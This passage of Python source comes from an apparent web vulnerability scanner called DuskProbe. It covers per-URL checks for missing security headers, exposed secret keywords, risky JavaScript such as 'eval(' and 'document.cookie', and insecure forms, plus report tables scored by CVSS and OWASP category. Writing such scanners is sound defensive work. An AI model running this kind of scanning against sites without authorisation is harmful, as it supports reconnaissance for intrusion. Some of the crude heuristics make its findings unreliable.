                        # Compile security issues
                        all_issues = []
                        if header_issues.get('missing_headers'):
                            all_issues.extend(header_issues['missing_headers'])
                        if content_issues.get('security_concerns'):
                            all_issues.extend(content_issues['security_concerns'])
                        if form_issues.get('insecure_forms'):
                            all_issues.extend(form_issues['insecure_forms'])
                        if js_issues.get('potential_issues'):
                            all_issues.extend(js_issues['potential_issues'])
                        
                        url_vulnerabilities['security_issues'] = all_issues
                        url_vulnerabilities['vulnerability_count'] = len(all_issues)
                        
                        # Calculate risk score
                        risk_score = 0
                        risk_score += len(header_issues.get('missing_headers', [])) * 5
                        risk_score += len(content_issues.get('security_concerns', [])) * 10
                        risk_score += len(form_issues.get('insecure_forms', [])) * 15
                        risk_score += len(js_issues.get('potential_issues', [])) * 8
                        
                        url_vulnerabilities['risk_score'] = min(risk_score, 100)
                        
                except Exception as e:
                    url_vulnerabilities['error'] = str(e)
                
                per_url_analysis[url] = url_vulnerabilities
                
        except Exception as e:
            self.config.logger.debug(f"Per-URL vulnerability analysis error: {e}")
        
        return per_url_analysis

    async def _analyze_security_headers(self, headers: Dict) -> Dict:
        """Analyze security headers for vulnerabilities"""
        security_headers = {
            'X-Frame-Options': 'Missing - Clickjacking protection',
            'X-XSS-Protection': 'Missing - XSS protection',
            'X-Content-Type-Options': 'Missing - MIME type sniffing protection',
            'Strict-Transport-Security': 'Missing - HTTPS enforcement',
            'Content-Security-Policy': 'Missing - Content injection protection',
            'Referrer-Policy': 'Missing - Referrer information control',
            'Permissions-Policy': 'Missing - Feature policy control'
        }
        
        missing_headers = []
        present_headers = {}
        
        for header, description in security_headers.items():
            if header.lower() not in [h.lower() for h in headers.keys()]:
                missing_headers.append(f"{header}: {description}")
            else:
                present_headers[header] = headers.get(header, 'Present')
        
        return {
            'missing_headers': missing_headers,
            'present_headers': present_headers,
            'security_score': max(0, 100 - (len(missing_headers) * 15))
        }

    async def _analyze_content_security(self, content: str, url: str) -> Dict:
        """Analyze content for security issues"""
        security_concerns = []
        
        try:
            content_lower = content.lower()
            
            # Check for sensitive information exposure
            if 'password' in content_lower and 'type="password"' not in content_lower:
                security_concerns.append("Potential password exposure in content")
            
            if any(term in content_lower for term in ['api_key', 'secret_key', 'private_key']):
                security_concerns.append("Potential API key exposure")
            
            if 'error' in content_lower and any(db in content_lower for db in ['sql', 'mysql', 'postgresql']):
                security_concerns.append("Potential database error disclosure")
            
            if '<script>' in content_lower and 'eval(' in content_lower:
                security_concerns.append("Potential dangerous JavaScript execution")
            
            if 'document.cookie' in content_lower:
                security_concerns.append("JavaScript cookie manipulation detected")
            
            if any(comment in content for comment in ['<!--', '/*', '//']):
                security_concerns.append("Code comments present (potential information disclosure)")
            
            # Check for inline JavaScript
            inline_js_count = content_lower.count('<script>')
            if inline_js_count > 5:
                security_concerns.append(f"High number of inline scripts ({inline_js_count})")
            
        except Exception as e:
            self.config.logger.debug(f"Content security analysis error: {e}")
        
        return {
            'security_concerns': security_concerns,
            'content_length': len(content),
            'inline_script_count': content_lower.count('<script>') if 'content_lower' in locals() else 0
        }

    async def _analyze_forms_security(self, content: str, url: str) -> Dict:
        """Analyze forms for security issues"""
        insecure_forms = []
        form_count = 0
        
        try:
            import re
            
            # Find all forms
            form_pattern = r'<form[^>]*>(.*?)</form>'
            forms = re.findall(form_pattern, content, re.DOTALL | re.IGNORECASE)
            form_count = len(forms)
            
            for i, form in enumerate(forms):
                form_issues = []
                
                # Check for missing CSRF protection
                if 'csrf' not in form.lower() and 'token' not in form.lower():
                    form_issues.append("Missing CSRF protection")
                
                # Check for password fields over HTTP
                if 'type="password"' in form.lower() and not url.startswith('https://'):
                    form_issues.append("Password field over HTTP")
                
                # Check for autocomplete on sensitive fields
                if 'autocomplete="off"' not in form.lower() and 'password' in form.lower():
                    form_issues.append("Autocomplete enabled on sensitive fields")
                
                # Check for file upload without restrictions
                if 'type="file"' in form.lower():
                    if 'accept=' not in form.lower():
                        form_issues.append("File upload without type restrictions")
                
                if form_issues:
                    insecure_forms.append(f"Form {i+1}: {', '.join(form_issues)}")
        
        except Exception as e:
            self.config.logger.debug(f"Form security analysis error: {e}")
        
        return {
            'insecure_forms': insecure_forms,
            'total_forms': form_count,
            'security_score': max(0, 100 - (len(insecure_forms) * 20))
        }

    async def _analyze_javascript_security(self, content: str) -> Dict:
        """Analyze JavaScript for security issues"""
        potential_issues = []
        
        try:
            content_lower = content.lower()
            
            # Check for dangerous functions
            dangerous_functions = ['eval(', 'settimeout(', 'setinterval(', 'function(', 'innerhtml']
            for func in dangerous_functions:
                if func in content_lower:
                    potential_issues.append(f"Potentially dangerous function: {func}")
            
            # Check for external script sources
            if 'src=' in content_lower:
                external_scripts = content_lower.count('src=')
                if external_scripts > 10:
                    potential_issues.append(f"High number of external scripts ({external_scripts})")
            
            # Check for inline event handlers
            event_handlers = ['onclick=', 'onload=', 'onerror=', 'onmouseover=']
            for handler in event_handlers:
                if handler in content_lower:
                    potential_issues.append(f"Inline event handler: {handler}")
            
            # Check for document.write usage
            if 'document.write' in content_lower:
                potential_issues.append("document.write usage detected (potential XSS)")
        
        except Exception as e:
            self.config.logger.debug(f"JavaScript security analysis error: {e}")
        
        return {
            'potential_issues': potential_issues,
            'script_count': content_lower.count('<script>') if 'content_lower' in locals() else 0
        }

    def _get_file_extension(self, url: str) -> str:
        """Get file extension from URL"""
        try:
            import urllib.parse
            path = urllib.parse.urlparse(url).path
            if '.' in path:
                return path.split('.')[-1].lower()
            return ''
        except:
            return ''

    def _get_file_type(self, filename: str) -> str:
        """Get file type category"""
        try:
            import mimetypes
            mime_type, _ = mimetypes.guess_type(filename)
            if mime_type:
                return mime_type.split('/')[0]
            return 'unknown'
        except:
            return 'unknown'


# --- Reporting ---

class Report:
    """Advanced detailed report generation with comprehensive vulnerability analysis."""

    def __init__(self, config: DuskProbeConfig):
        self.config = config
        self.console = config.console
        self.findings = []

    def generate_report(self, scan_results: Dict):
        """Generate comprehensive detailed vulnerability report."""
        self.findings = scan_results.get('findings', [])
        self.site_info = scan_results.get('site_info', {})  # Store site info for technical display
        
        if not self.findings and not self.config.args.quiet:
            self.console.print("[bold green]✅ No vulnerabilities found![/bold green]")
            # Still show technical information even if no vulnerabilities found
            if not self.config.args.quiet:
                self._display_technical_intelligence()
                self._display_advanced_intelligence()
                self._display_comprehensive_discovery_analysis()
                self._display_website_structure_analysis()
                self._display_per_url_vulnerabilities()
            return

        if PD_AVAILABLE: 
            self.df = pd.DataFrame(self.findings)
        else: 
            self.df = None

        if not self.config.args.quiet:
            self._display_summary(scan_results)
            self._display_detailed_table()
            self._display_vulnerability_analysis()
            self._display_technical_intelligence()  # Add technical information display
            self._display_advanced_intelligence()  # Add advanced intelligence display
            self._display_comprehensive_discovery_analysis()  # Add comprehensive discovery analysis
            self._display_website_structure_analysis()  # Add website structure mapping display
            self._display_per_url_vulnerabilities()  # Add per-URL vulnerability analysis display
            self._display_remediation_guide()
            self._display_graph_visualizations()  # Add graph visualizations

        if self.config.args.output: 
            self._save_detailed_report()

    def _display_summary(self, scan_results: Dict):
        """Enhanced summary with comprehensive site information."""
        site_info = scan_results.get('site_info', {})
        
        # Enhanced summary with security posture assessment
        summary_text = f"[bold]Target URL:[/bold] {site_info.get('url', 'N/A')}\n"
        summary_text += f"[bold]IP Address:[/bold] {site_info.get('ip_address', 'N/A')}\n"
        summary_text += f"[bold]Server Software:[/bold] {site_info.get('server', 'N/A')}\n"
        summary_text += f"[bold]Total Security Checks:[/bold] {scan_results.get('total_checks', 'N/A')}\n"
        summary_text += f"[bold]Scan Duration:[/bold] {self._get_scan_duration()}\n"
        summary_text += f"[bold]Security Posture:[/bold] {self._assess_security_posture()}\n"
        
        if site_info.get('technologies'):
            summary_text += f"[bold]Detected Technologies:[/bold] {', '.join(site_info.get('technologies', []))}\n"
        
        summary_panel = Panel(
            summary_text.rstrip(),
            title="[bold cyan]🔍 Security Assessment Overview[/bold cyan]", 
            expand=False, 
            border_style="cyan"
        )
        self.console.print(summary_panel)

    def _display_detailed_table(self):
        """Display comprehensive vulnerability table with extensive details."""
        if not self.findings:
            return
            
        table = Table(
            title="[bold red]🚨 Comprehensive Vulnerability Analysis Report[/bold red]", 
            show_header=True, 
            header_style="bold magenta",
            expand=True
        )
        
        # Enhanced comprehensive columns with more detailed parameters
        table.add_column("Severity", style="dim", width=9)
        table.add_column("Category", width=20)
        table.add_column("Vulnerability Type", width=15)
        table.add_column("CVE/CWE", width=12)
        table.add_column("CVSS Score", width=8)
        table.add_column("Risk Score", width=8)
        table.add_column("OWASP 2025", width=18)
        table.add_column("Affected URL/Component", width=25)
        table.add_column("Exploit Difficulty", width=10)
        table.add_column("Attack Vector", width=10)
        table.add_column("Business Impact", width=15)
        table.add_column("Remediation Priority", width=12)
        table.add_column("Detection Time", width=12)
        table.add_column("Technical Details", width=20)

        severity_styles = {
            'CRITICAL': 'bold red on black', 
            'HIGH': 'red', 
            'MEDIUM': 'yellow', 
            'LOW': 'cyan', 
            'INFO': 'green'
        }
        
        # Sort by risk score for priority presentation
        sorted_findings = sorted(
            self.findings, 
            key=lambda x: (x.get('risk_score', 0), self._severity_to_num(x.get('severity', 'INFO'))), 
            reverse=True
        )
        
        for finding in sorted_findings:
            severity = finding.get('severity', 'INFO')
            style = severity_styles.get(severity, 'white')
            
            # Get comprehensive details with enhanced parameters
            category = self._truncate_text(finding.get('vulnerability_category', '🔍 Uncategorized'), 18)
            cve_cwe = f"CVE: {', '.join(finding.get('cve_references', ['N/A'])[:1])}\nCWE: {finding.get('cwe_id', 'N/A')}"
            cvss_score = f"{finding.get('cvss_score', 0.0):.1f}/10.0"
            risk_score = f"{finding.get('risk_score', 0)}/100"
            owasp_category = self._truncate_text(finding.get('owasp_category', 'N/A'), 16)
            
            # Enhanced URL/Component information with more details
            url = finding.get('url', 'N/A')
            component_details = finding.get('details', '')
            
            # Create comprehensive affected component description
            affected_component = f"{self._truncate_text(url, 20)}"
            if component_details and 'missing' in component_details.lower():
                header_name = component_details.replace('Missing ', '').replace('missing ', '')
                affected_component += f"\n📍 {self._truncate_text(header_name, 15)}"
            elif component_details:
                affected_component += f"\n🔍 {self._truncate_text(component_details, 15)}"
            
            # Enhanced technical details
            exploit_diff = finding.get('exploit_difficulty', 'Unknown')
            attack_vector = finding.get('attack_vector', 'Unknown')
            business_impact = self._truncate_text(finding.get('business_impact', self._assess_business_impact(finding)), 13)
            
            # New enhanced parameters
            remediation_priority = self._calculate_remediation_priority(finding)
            detection_time = self._format_detection_time(finding.get('timestamp', ''))
            technical_details = self._get_enhanced_technical_details(finding)
            
            table.add_row(
                f"[{style}]{severity}[/{style}]",
                category,
                self._truncate_text(finding.get('type', 'N/A'), 13),
                cve_cwe,
                cvss_score,
                risk_score,
                owasp_category,
                affected_component,
                exploit_diff,
                attack_vector,
                business_impact,
                remediation_priority,
                detection_time,
                technical_details
            )
        
        self.console.print(table)

    def _display_vulnerability_analysis(self):
        """Display detailed vulnerability analysis and statistics."""
        if not self.findings:
            return

        # Comprehensive statistics
        stats = self._calculate_comprehensive_stats()
        
        analysis_text = f"[bold]📊 Vulnerability Statistics:[/bold]\n"
        analysis_text += f"• Total Vulnerabilities: {stats['total']}\n"
        analysis_text += f"• Critical: {stats['critical']} | High: {stats['high']} | Medium: {stats['medium']} | Low: {stats['low']}\n"
        analysis_text += f"• Average CVSS Score: {stats['avg_cvss']:.1f}/10.0\n"
        analysis_text += f"• Average Risk Score: {stats['avg_risk']}/100\n"
        analysis_text += f"• Exploitable Vulnerabilities: {stats['exploitable']}\n"
        analysis_text += f"• Compliance Violations: {stats['compliance_issues']}\n\n"
        
        analysis_text += f"[bold]🎯 Attack Vector Analysis:[/bold]\n"
        for vector, count in stats['attack_vectors'].items():
            analysis_text += f"• {vector}: {count} vulnerabilities\n"
        
        analysis_text += f"\n[bold]📋 OWASP 2025 Category Breakdown:[/bold]\n"
        for category, count in stats['owasp_categories'].items():
            analysis_text += f"• {category}: {count} vulnerabilities\n"
        
        analysis_text += f"\n[bold]🏢 Business Impact Assessment:[/bold]\n"
        analysis_text += f"• Data Breach Risk: {stats['data_breach_risk']}\n"
        analysis_text += f"• Service Disruption Risk: {stats['service_disruption_risk']}\n"
        analysis_text += f"• Compliance Risk: {stats['compliance_risk']}\n"
        analysis_text += f"• Reputation Risk: {stats['reputation_risk']}\n"

        analysis_panel = Panel(
            analysis_text.rstrip(),
            title="[bold yellow]📈 Comprehensive Vulnerability Analysis[/bold yellow]",
            expand=False,
            border_style="yellow"
        )
        self.console.print(analysis_panel)

    def _display_remediation_guide(self):
        """Display detailed remediation guidance."""
        if not self.findings:
            return

        remediation_text = f"[bold]🔧 Priority Remediation Steps:[/bold]\n\n"
        
        # Group by vulnerability type and provide detailed remediation
        vuln_types = {}
        for finding in self.findings:
            vuln_type = finding.get('type', 'Unknown')
            if vuln_type not in vuln_types:
                vuln_types[vuln_type] = []
            vuln_types[vuln_type].append(finding)
        
        priority_order = ['SQLi', 'OS Command Injection', 'XSS', 'LFI', 'SSRF', 'Sensitive File Exposure', 'Missing Header']
        
        for i, vuln_type in enumerate(priority_order, 1):
            if vuln_type in vuln_types:
                findings = vuln_types[vuln_type]
                remediation_text += f"[bold]{i}. {vuln_type} ({len(findings)} instances):[/bold]\n"
                remediation_text += f"   • {findings[0].get('remediation_steps', 'No specific remediation available')}\n"
                remediation_text += f"   • Technical Details: {findings[0].get('technical_details', 'No details available')}\n"
                remediation_text += f"   • Example: {findings[0].get('poc_example', 'No example available')}\n\n"
        
        remediation_text += f"[bold]🛡️ General Security Recommendations:[/bold]\n"
        remediation_text += f"• Implement Web Application Firewall (WAF)\n"
        remediation_text += f"• Regular security testing and code reviews\n"
        remediation_text += f"• Security awareness training for development team\n"
        remediation_text += f"• Implement security headers and HTTPS\n"
        remediation_text += f"• Regular security updates and patch management\n"

        remediation_panel = Panel(
            remediation_text.rstrip(),
            title="[bold green]🛠️ Detailed Remediation Guide[/bold green]",
            expand=False,
            border_style="green"
        )
        self.console.print(remediation_panel)

    def _calculate_remediation_priority(self, finding: Dict) -> str:
        """Calculate remediation priority based on multiple factors."""
        severity = finding.get('severity', 'INFO').upper()
        cvss_score = finding.get('cvss_score', 0.0)
        risk_score = finding.get('risk_score', 0)
        exploit_difficulty = finding.get('exploit_difficulty', 'Unknown').lower()
        
        # Calculate priority score
        priority_score = 0
        
        # Severity weight (40%)
        severity_weights = {'CRITICAL': 40, 'HIGH': 30, 'MEDIUM': 20, 'LOW': 10, 'INFO': 5}
        priority_score += severity_weights.get(severity, 5)
        
        # CVSS score weight (25%)
        priority_score += (cvss_score / 10.0) * 25
        
        # Risk score weight (25%)
        priority_score += (risk_score / 100.0) * 25
        
        # Exploit difficulty weight (10%) - easier exploitation = higher priority
        exploit_weights = {'easy': 10, 'medium': 6, 'hard': 3, 'unknown': 5}
        priority_score += exploit_weights.get(exploit_difficulty, 5)
        
        # Determine priority level
        if priority_score >= 80:
            return "🚨 URGENT"
        elif priority_score >= 60:
            return "⚠️ HIGH"
        elif priority_score >= 40:
            return "🔶 MEDIUM"
        elif priority_score >= 20:
            return "🔵 LOW"
        else:
            return "ℹ️ INFO"

    def _format_detection_time(self, timestamp: str) -> str:
        """Format detection timestamp for display."""
        if not timestamp:
            return "Unknown"
        
        try:
            from datetime import datetime
            # Parse ISO format timestamp
            dt = datetime.fromisoformat(timestamp.replace('Z', '+00:00'))
            return dt.strftime("%H:%M:%S")
        except:
            return "Unknown"

    def _get_enhanced_technical_details(self, finding: Dict) -> str:
        """Get enhanced technical details for the vulnerability."""
        details = []
        
        # Add HTTP method if available
        method = finding.get('http_method', '')
        if method:
            details.append(f"Method: {method}")
        
        # Add parameter information
        parameter = finding.get('parameter', '')
        if parameter:
            details.append(f"Param: {parameter}")
        
        # Add payload information
        payload = finding.get('payload', '')
        if payload and len(payload) < 20:
            details.append(f"Payload: {payload}")
        
        # Add response code
        response_code = finding.get('response_code', '')
        if response_code:
            details.append(f"Status: {response_code}")
        
        # Add content type
        content_type = finding.get('content_type', '')
        if content_type:
            details.append(f"Type: {content_type.split(';')[0]}")
        
        # Add authentication requirement
        auth_required = finding.get('authentication_required', False)
        if auth_required:
            details.append("🔒 Auth Required")
        
        # Add encryption info
        encrypted = finding.get('encrypted', False)
        if encrypted:
            details.append("🔐 Encrypted")
        else:
            details.append("🔓 Plain")
        
        # Join details with line breaks for better display
        result = '\n'.join(details[:4])  # Limit to 4 details for space
        return result if result else "Standard Web"

    def _assess_business_impact(self, finding: Dict) -> str:
        """Assess business impact based on vulnerability characteristics."""
        severity = finding.get('severity', 'INFO').upper()
        vuln_type = finding.get('type', '').lower()
        
        # High impact vulnerabilities
        if severity in ['CRITICAL', 'HIGH']:
            if any(keyword in vuln_type for keyword in ['injection', 'authentication', 'authorization', 'rce']):
                return "💥 Critical Impact"
            elif any(keyword in vuln_type for keyword in ['xss', 'csrf', 'redirect']):
                return "⚠️ High Impact"
            else:
                return "🔴 Significant Impact"
        
        # Medium impact vulnerabilities
        elif severity == 'MEDIUM':
            if any(keyword in vuln_type for keyword in ['disclosure', 'leak', 'exposure']):
                return "🟡 Moderate Impact"
            else:
                return "📊 Medium Impact"
        
        # Low impact vulnerabilities
        elif severity == 'LOW':
            return "🔵 Low Impact"
        
        # Info level
        else:
            return "ℹ️ Minimal Impact"

    def _calculate_comprehensive_stats(self) -> Dict:
        """Calculate comprehensive vulnerability statistics."""
        stats = {
            'total': len(self.findings),
            'critical': 0, 'high': 0, 'medium': 0, 'low': 0,
            'avg_cvss': 0.0, 'avg_risk': 0,
            'exploitable': 0, 'compliance_issues': 0,
            'attack_vectors': {}, 'owasp_categories': {},
            'data_breach_risk': 'Unknown',
            'service_disruption_risk': 'Unknown', 'compliance_risk': 'Unknown',
            'reputation_risk': 'Unknown'
        }
        
        if not self.findings:
            return stats
        
        total_cvss = 0
        total_risk = 0
        
        for finding in self.findings:
            # Severity counts
            severity = finding.get('severity', 'INFO').lower()
            if severity == 'critical':
                stats['critical'] += 1
            elif severity == 'high':
                stats['high'] += 1
            elif severity == 'medium':
                stats['medium'] += 1
            elif severity == 'low':
                stats['low'] += 1
            
            # Score calculations
            total_cvss += finding.get('cvss_score', 0.0)
            total_risk += finding.get('risk_score', 0)
            
            # Exploitability
            if finding.get('exploit_difficulty') == 'Easy':
                stats['exploitable'] += 1
            
            # Attack vectors
            vector = finding.get('attack_vector', 'Unknown')
            stats['attack_vectors'][vector] = stats['attack_vectors'].get(vector, 0) + 1
            
            # OWASP 2025 categories
            category = finding.get('vulnerability_category', '🔍 Uncategorized')
            stats['owasp_categories'][category] = stats['owasp_categories'].get(category, 0) + 1
            
            # Compliance issues
            if 'PCI' in finding.get('compliance_impact', '') or 'GDPR' in finding.get('compliance_impact', ''):
                stats['compliance_issues'] += 1
        
        # Calculate averages
        if self.findings:
            stats['avg_cvss'] = total_cvss / len(self.findings)
            stats['avg_risk'] = total_risk // len(self.findings)
        
        # Risk assessments
        if stats['critical'] > 0:
            stats['data_breach_risk'] = 'CRITICAL'
            stats['service_disruption_risk'] = 'HIGH'
            stats['compliance_risk'] = 'HIGH'
            stats['reputation_risk'] = 'HIGH'
        elif stats['high'] > 2:
            stats['data_breach_risk'] = 'HIGH'
            stats['service_disruption_risk'] = 'MEDIUM'
            stats['compliance_risk'] = 'MEDIUM'
            stats['reputation_risk'] = 'MEDIUM'
        else:
            stats['data_breach_risk'] = 'LOW'
            stats['service_disruption_risk'] = 'LOW'
            stats['compliance_risk'] = 'LOW'
            stats['reputation_risk'] = 'LOW'
        
        return stats

    def _severity_to_num(self, severity: str) -> int:
        """Convert severity to number for sorting."""
        severity_order = {'CRITICAL': 4, 'HIGH': 3, 'MEDIUM': 2, 'LOW': 1, 'INFO': 0}
        return severity_order.get(severity.upper(), 0)

    def _truncate_text(self, text: str, max_length: int) -> str:
        """Truncate text to fit in table columns."""
        if len(text) <= max_length:
            return text
        return text[:max_length-3] + "..."

    def _get_scan_duration(self) -> str:
        """Get scan duration (placeholder)."""
        return "< 1 minute"

    def _assess_security_posture(self) -> str:
        """Assess overall security posture."""
        if not self.findings:
            return "[green]EXCELLENT[/green]"
        
        critical_count = sum(1 for f in self.findings if f.get('severity') == 'CRITICAL')
        high_count = sum(1 for f in self.findings if f.get('severity') == 'HIGH')
        
        if critical_count > 0:
            return "[red]CRITICAL - Immediate Action Required[/red]"
        elif high_count > 2:
            return "[yellow]POOR - Multiple High-Risk Issues[/yellow]"
        elif high_count > 0:
            return "[orange]FAIR - Some Security Concerns[/orange]"
        else:
            return "[green]GOOD - Minor Issues Only[/green]"

    def _display_graph_visualizations(self):
        """Display comprehensive graph visualizations using termgraph."""
        if not TERMGRAPH_AVAILABLE:
            return
            
        self.console.print("\n")
        
        # Display vulnerability severity distribution
        self._display_severity_distribution_graph()
        
        # Display OWASP category breakdown
        self._display_owasp_category_graph()
        
        # Display CVSS score distribution
        self._display_cvss_score_graph()
        
        # Display attack vector analysis
        self._display_attack_vector_graph()
        
        # Display remediation priority graph
        self._display_remediation_priority_graph()

    def _display_severity_distribution_graph(self):
        """Display enhanced vulnerability severity distribution with table-based UI."""
        if not self.findings:
            return
            
        # Count vulnerabilities by severity with detailed analytics
        severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
        severity_cvss = {'CRITICAL': [], 'HIGH': [], 'MEDIUM': [], 'LOW': [], 'INFO': []}
        severity_types = {'CRITICAL': set(), 'HIGH': set(), 'MEDIUM': set(), 'LOW': set(), 'INFO': set()}
        
        for finding in self.findings:
            severity = finding.get('severity', 'INFO').upper()
            if severity in severity_counts:
                severity_counts[severity] += 1
                severity_cvss[severity].append(finding.get('cvss_score', 0.0))
                severity_types[severity].add(finding.get('type', 'Unknown'))
        
        # Filter out zero counts
        data = [(k, v) for k, v in severity_counts.items() if v > 0]
        
        if not data:
            return
        
        total_vulns = sum(severity_counts.values())
        
        self.console.print(Panel(
            "[bold cyan]📊 Enhanced Vulnerability Severity Distribution & Analytics[/bold cyan]",
            style="cyan"
        ))
        
        # Create rich table for severity distribution
        from rich.table import Table
        
        severity_table = Table(title="🎯 Vulnerability Severity Distribution", show_header=True, header_style="bold magenta")
        severity_table.add_column("Severity", style="bold", width=12)
        severity_table.add_column("Visual Distribution", width=40)
        severity_table.add_column("Count", justify="center", width=8)
        severity_table.add_column("Percentage", justify="center", width=12)
        severity_table.add_column("Avg CVSS", justify="center", width=10)
        severity_table.add_column("Types", justify="center", width=8)
        severity_table.add_column("Priority", width=15)
        
        # Color and style mapping
        severity_colors = {
            'CRITICAL': 'red',
            'HIGH': 'orange1', 
            'MEDIUM': 'yellow',
            'LOW': 'green',
            'INFO': 'blue'
        }
        
        risk_indicators = {
            'CRITICAL': '🚨 URGENT',
            'HIGH': '⚠️ PRIORITY', 
            'MEDIUM': '🔶 MODERATE',
            'LOW': '✅ MINOR',
            'INFO': 'ℹ️ NOTICE'
        }
        
        max_count = max(count for _, count in data) if data else 1
        
        for severity, count in sorted(data, key=lambda x: ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO'].index(x[0])):
            percentage = (count / total_vulns) * 100
            color = severity_colors.get(severity, 'white')
            risk_indicator = risk_indicators.get(severity, '')
            
            # Calculate average CVSS for this severity
            avg_cvss = sum(severity_cvss[severity]) / len(severity_cvss[severity]) if severity_cvss[severity] else 0.0
            unique_types = len(severity_types[severity])
            
            # Create visual progress bar
            bar_percentage = int((count / max_count) * 35)
            filled_blocks = '▓' * bar_percentage
            empty_blocks = '░' * (35 - bar_percentage)
            visual_bar = f"{filled_blocks}{empty_blocks}"
            
            severity_table.add_row(
                f"[{color}]{severity}[/{color}]",
                f"[{color}]{visual_bar}[/{color}]",
                f"[{color}]{count}[/{color}]",
                f"[{color}]{percentage:.1f}%[/{color}]",
                f"[{color}]{avg_cvss:.1f}[/{color}]",
                f"[{color}]{unique_types}[/{color}]",
                f"[{color}]{risk_indicator}[/{color}]"
            )
        
        self.console.print(severity_table)
        
        # Analytics summary table
        analytics_table = Table(title="📈 Comprehensive Analytics Summary", show_header=True, header_style="bold cyan")
        analytics_table.add_column("Metric", style="bold yellow", width=25)
        analytics_table.add_column("Value", style="bold white", width=15)
        analytics_table.add_column("Analysis", style="cyan", width=50)
        
        # Calculate comprehensive metrics
        total_unique_types = len(set(f.get('type', 'Unknown') for f in self.findings))
        avg_cvss_all = sum(f.get('cvss_score', 0.0) for f in self.findings) / len(self.findings) if self.findings else 0.0
        most_common = max(data, key=lambda x: x[1]) if data else ('N/A', 0)
        high_risk_issues = sum(count for severity, count in data if severity in ['CRITICAL', 'HIGH'])
        high_risk_percentage = (high_risk_issues / total_vulns) * 100 if total_vulns > 0 else 0
        
        analytics_table.add_row(
            "🎯 Total Vulnerabilities", 
            str(total_vulns), 
            "Complete vulnerability count across all severity levels"
        )
        analytics_table.add_row(
            "🔍 Unique Vuln Types", 
            str(total_unique_types), 
            "Diverse attack vectors requiring different remediation approaches"
        )
        analytics_table.add_row(
            "📊 Average CVSS Score", 
            f"{avg_cvss_all:.1f}/10.0", 
            "Overall risk assessment based on CVSS v3.1 scoring methodology"
        )
        analytics_table.add_row(
            "⚡ Most Common Severity", 
            f"{most_common[0]} ({most_common[1]})", 
            "Primary security concern requiring focused remediation effort"
        )
        analytics_table.add_row(
            "🚨 High-Risk Distribution", 
            f"{high_risk_percentage:.1f}%", 
            "Critical and high-severity issues needing immediate attention"
        )
        
        # Risk posture assessment
        if high_risk_percentage >= 50:
            risk_status = "[red]🚨 CRITICAL[/red]"
            risk_desc = "Emergency security response required - multiple critical issues"
        elif high_risk_percentage >= 25:
            risk_status = "[orange1]⚠️ HIGH RISK[/orange1]"
            risk_desc = "Accelerated remediation timeline needed for security issues"
        elif high_risk_percentage >= 10:
            risk_status = "[yellow]� MODERATE[/yellow]"
            risk_desc = "Standard security maintenance cycle with priority focus"
        else:
            risk_status = "[green]✅ LOW RISK[/green]"
            risk_desc = "Normal security posture with routine maintenance needed"
            
        analytics_table.add_row(
            "🛡️ Security Posture", 
            risk_status, 
            risk_desc
        )
        
        self.console.print("\n")
        self.console.print(analytics_table)

    def _display_owasp_category_graph(self):
        """Display comprehensive OWASP 2025 category breakdown with table-based UI."""
        if not self.findings:
            return
            
        # Enhanced OWASP category analysis
        owasp_data = {}
        owasp_severity = {}
        owasp_types = {}
        owasp_descriptions = {
            'A01:2025': 'Broken Access Control',
            'A02:2025': 'Cryptographic Failures', 
            'A03:2025': 'Injection Attacks',
            'A04:2025': 'Insecure Design',
            'A05:2025': 'Security Misconfiguration',
            'A06:2025': 'Vulnerable Components',
            'A07:2025': 'Authentication Failures',
            'A08:2025': 'Software Integrity Failures',
            'A09:2025': 'Logging Failures',
            'A10:2025': 'Server-Side Request Forgery'
        }
        
        for finding in self.findings:
            category = finding.get('owasp_category', 'Unknown')
            category_code = category.split('–')[0].strip() if '–' in category else category
            
            if category_code not in owasp_data:
                owasp_data[category_code] = 0
                owasp_severity[category_code] = []
                owasp_types[category_code] = set()
            
            owasp_data[category_code] += 1
            owasp_severity[category_code].append(finding.get('severity', 'INFO'))
            owasp_types[category_code].add(finding.get('type', 'Unknown'))
        
        if not owasp_data:
            return
        
        total_vulns = sum(owasp_data.values())
        data = sorted(owasp_data.items(), key=lambda x: x[1], reverse=True)
        
        self.console.print("\n")
        self.console.print(Panel(
            "[bold cyan]🎯 OWASP 2025 Framework Compliance & Risk Analysis[/bold cyan]",
            style="cyan"
        ))
        
        # Create rich table for OWASP category analysis
        from rich.table import Table
        
        owasp_table = Table(title="🛡️ OWASP 2025 Category Distribution", show_header=True, header_style="bold magenta")
        owasp_table.add_column("Category", style="bold", width=12)
        owasp_table.add_column("Description", style="cyan", width=25)
        owasp_table.add_column("Visual Distribution", width=35)
        owasp_table.add_column("Count", justify="center", width=8)
        owasp_table.add_column("Percentage", justify="center", width=12)
        owasp_table.add_column("Risk Level", justify="center", width=12)
        owasp_table.add_column("Types", justify="center", width=8)
        
        max_count = max(count for _, count in data) if data else 1
        
        for category, count in data:
            percentage = (count / total_vulns) * 100
            description = owasp_descriptions.get(category, 'Unknown Category')
            
            # Calculate risk metrics for this category
            severities = owasp_severity[category]
            high_risk = sum(1 for s in severities if s.upper() in ['CRITICAL', 'HIGH'])
            risk_percentage = (high_risk / len(severities)) * 100 if severities else 0
            unique_types = len(owasp_types[category])
            
            # Risk level indicator with color
            if risk_percentage >= 80:
                risk_level = "[red]🔴 CRITICAL[/red]"
                row_color = "red"
            elif risk_percentage >= 60:
                risk_level = "[orange1]🟠 HIGH[/orange1]"
                row_color = "orange1"
            elif risk_percentage >= 40:
                risk_level = "[yellow]🟡 MEDIUM[/yellow]"
                row_color = "yellow"
            else:
                risk_level = "[green]🟢 LOW[/green]"
                row_color = "green"
            
            # Create visual progress bar
            bar_percentage = int((count / max_count) * 30)
            filled_blocks = '▓' * bar_percentage
            empty_blocks = '░' * (30 - bar_percentage)
            visual_bar = f"{filled_blocks}{empty_blocks}"
            
            owasp_table.add_row(
                f"[{row_color}]{category}[/{row_color}]",
                f"[{row_color}]{description}[/{row_color}]",
                f"[{row_color}]{visual_bar}[/{row_color}]",
                f"[{row_color}]{count}[/{row_color}]",
                f"[{row_color}]{percentage:.1f}%[/{row_color}]",
                risk_level,
                f"[{row_color}]{unique_types}[/{row_color}]"
            )
        
        self.console.print(owasp_table)
        
        # OWASP compliance summary table
        compliance_table = Table(title="📊 OWASP 2025 Compliance Analysis", show_header=True, header_style="bold cyan")
        compliance_table.add_column("Compliance Metric", style="bold yellow", width=25)
        compliance_table.add_column("Score/Value", style="bold white", width=15)
        compliance_table.add_column("Assessment", style="cyan", width=50)
        
